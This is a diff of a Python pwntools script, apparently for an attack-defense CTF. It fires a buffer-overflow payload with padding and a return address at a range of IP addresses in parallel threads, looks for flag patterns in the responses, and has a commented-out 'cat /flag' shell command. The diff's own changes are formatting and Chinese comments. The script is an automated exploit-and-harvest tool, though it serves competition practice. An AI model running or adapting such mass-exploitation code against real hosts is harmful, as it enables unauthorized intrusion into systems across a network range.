@@ -5,6 +5,7 @@ import re
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from time import sleep
+
 '''
 ubuntu中运行
 '''
@@ -17,7 +18,7 @@ THREADS = 20
 PAYLOAD = b'a' * 0x28 + p64(0x40064A)
 FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
 FLAG_FILE = "auto_flag.txt"
-IP_RANGE=range(240,255)
+IP_RANGE = range(240, 255)
 QUESTION_ID = "90122"
 
 elf = ELF(binary)
@@ -27,6 +28,7 @@ gdbscript = '''
 '''
 # 精确屏蔽 InsecureRequestWarning 警告
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
 
 def process_host():  # 探活
 
@@ -91,11 +93,11 @@ def exploit_host(ip):
     try:
         io = start(ip, PORTS)
         sl(PAYLOAD)
-
+        #sl(b'cat /flag')  #getshell时需要发送命令
         # 接收程序返回的响应内容
         response = b''
         try:
-            response = ru(b'\n', drop=False)
+            response = ru(b'\n', drop=False)  #从远程连接或本地进程的输入流中接收数据，直到遇到字节串 b'\n' 为止‌
         except:
             pass
 
